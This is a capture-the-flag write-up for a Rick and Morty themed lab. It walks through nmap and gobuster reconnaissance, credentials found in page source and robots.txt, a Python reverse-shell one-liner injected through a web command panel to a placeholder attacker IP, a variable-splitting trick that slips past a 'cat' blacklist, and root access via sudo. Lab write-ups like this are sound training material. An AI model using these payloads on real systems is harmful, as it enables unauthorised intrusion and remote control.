# Pickle And Morty WriteUp

Write up for pickle and morty challenge

## Reconnaissance

Use Nmap, we'll get 2 ports:
1. 22(SSH)
2. 80(TCP)

When we access using port 80, and open the developer tools, we'll see the command with a username 
**(R1ckRul3s)**

I tried to use Hydra to access ssh with that username but it seems that ssh access but it didn't work

So i tried to use **gobuster**, to  bruteforce all directory that available:

```sh
gobuster dir -u [web_ip] -w [dir_lists] php,js,py
```
and here's some directories I found:
- index.html
- portal.php

After that we need to input username, and password that I haven't found yet.

I tried to find dissalow dir in robots.txt and found:
**(Wubbalubbadubdub)**

we can use it as password in portal.php and able to access the dashboard.

## Information

- Username: R1ckRul3s
- password: Wubbalubbadubdub
- Some Kind base64 decoded text: rabbit hole

## Reverse Shell

inject python reverse shell command in text area
```sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[Your_tun0_IP]",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

## Gaining Root Access

after we get the reverse shell, I tried to run:

```sh
sudo bash
```
that so we wil run the bash as root

## Ingredients:

### First Ingreditents
we'll get the first ingredient in the portal.php, but ```cat``` was blacklisted, so we use:
```sh
a=ca b=at c={ingredientstextfile} d=.txt;$a$b ${c}${d} 
```
which wil result to 
```sh
	cat {ingredientstextfile}.txt 
```
And give us the first inggredients: **{first ingredients}**

### Second Ingredients
after we gain the reverse shell, go to /home/rick , and 
you'll found the second inggredients:**{second ingredients}**

### Third Ingredients
after we got the root access, we'll find the third ingredients: **{third ingredients}**